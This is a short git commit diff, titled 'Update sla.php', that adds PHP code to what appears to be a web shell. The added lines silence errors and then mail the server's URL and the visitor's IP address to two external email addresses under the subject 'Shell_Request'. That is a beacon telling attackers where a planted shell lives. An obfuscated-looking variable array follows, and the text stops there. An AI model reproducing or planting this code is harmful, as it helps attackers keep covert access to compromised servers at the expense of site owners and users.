ef2a66c8b75d3b777e62af7a2d81f7fffee61dad
PreEdaetor <73938089+PreEdaetor@users.noreply.github.com>
2020-11-14 09:04:25 +0700

    Update sla.php

--- sla.php
+++ sla.php
@@ -1,4 +1,14 @@
 <?php
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+set_time_limit(0);
+ini_set('memory_limit', '64M');
+header('Content-Type: text/html; charset=UTF-8');
+$tujuanmail = 'lambangwes@gmail.com, mrhorden007@gmail.com';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
+mail($tujuanmail, "Shell_Request", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+?><?php
 set_time_limit(0);
 ini_set('memory_limit', '-1');
 $ChJEsJbrSOGlr = array(
